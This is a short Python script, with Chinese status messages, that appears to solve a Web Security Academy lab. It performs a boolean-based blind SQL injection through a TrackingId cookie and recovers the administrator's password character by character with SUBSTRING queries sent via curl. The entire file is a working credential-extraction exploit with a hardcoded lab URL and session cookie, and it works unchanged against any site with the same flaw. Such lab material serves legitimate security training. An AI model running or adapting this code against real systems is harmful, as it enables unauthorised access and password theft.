import subprocess
import time

url = "https://0a5b008c036172da808c7166009500f7.web-security-academy.net/filter?category=Food+%26+Drink"
session_cookie = "wDaqPRLIFkP113z8DHZZ2HgjUG2Dbkhm"
tracking_id = "2uxQa0mqFFGDSH5U"

password = ""
characters = "abcdefghijklmnopqrstuvwxyz0123456789"

for position in range(1, 21):
    for char in characters:
        tracking = f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}"
        cookie = f"TrackingId={tracking}; session={session_cookie}"
        time.sleep(0.1)

        result = subprocess.run(
            ["curl", "-s", "-k", "-b", cookie, url],
            capture_output=True, text=True
        )

        if "Welcome back" in result.stdout:
            password += char
            print(f"[+] 第{position}位: {char}  |  已知密码: {password}")
            break
    else:
        print(f"[-] 第{position}位未找到!")

print(f"\n[完成] 管理员密码: {password}")
